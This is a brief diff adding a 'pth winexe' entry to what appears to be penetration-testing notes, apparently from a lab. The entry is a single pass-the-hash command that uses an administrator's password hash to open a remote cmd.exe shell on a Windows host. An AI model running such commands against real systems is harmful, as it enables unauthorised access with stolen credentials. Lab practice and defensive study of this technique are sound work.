@@ -156,3 +156,7 @@ Microsoft Windows [Version 10.0.19044.1288]
 C:\Windows\system32>
 ```
 
+### pth winexe
+
+- `pth-winexe -U 'admin%hash' //10.10.67.135 cmd.exe`
+
